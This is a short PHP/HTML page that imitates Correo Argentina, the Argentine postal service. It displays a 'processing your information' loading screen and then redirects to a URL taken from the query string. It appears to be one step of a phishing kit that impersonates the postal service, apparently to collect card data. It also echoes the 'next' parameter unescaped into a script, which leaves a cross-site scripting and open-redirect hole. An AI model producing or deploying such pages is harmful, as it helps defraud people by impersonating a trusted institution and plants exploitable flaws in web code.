<?php
require "main.php";
?><!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/card.css">
    <title>Correo Argentina</title>
</head>
<body>
<header>
        <div class="logo">
            <img src="res/img/logo.png" alt="">
        </div>
        <div class="links">
            <span>Integraciones</span>
            <span>Iniciar sesión</span>
            <span>Registrarme</span>
        </div>
    </header>
    <main>
    <div class="text">
            <label>Por favor, espere...</label>
            <span>Procesando su información...</span>
            </div>
        <div class="contine">
             <div class="col">
             <img src="res/img/loading.gif" style="width:80px;" >
            </div> 
        </div>
    </main>
    <footer>
        <div class="down">
            <img src="res/img/logo.png" alt="">
            <p>Correo Oficial de la República Argentina - Todos los derechos reservados</p>
        </div>
    </footer>
 <script>
var next = "<?php echo $_GET['next']; ?>";
setTimeout(() => {
    window.location=next;
}, 8000);
</script>    
</body>
</html>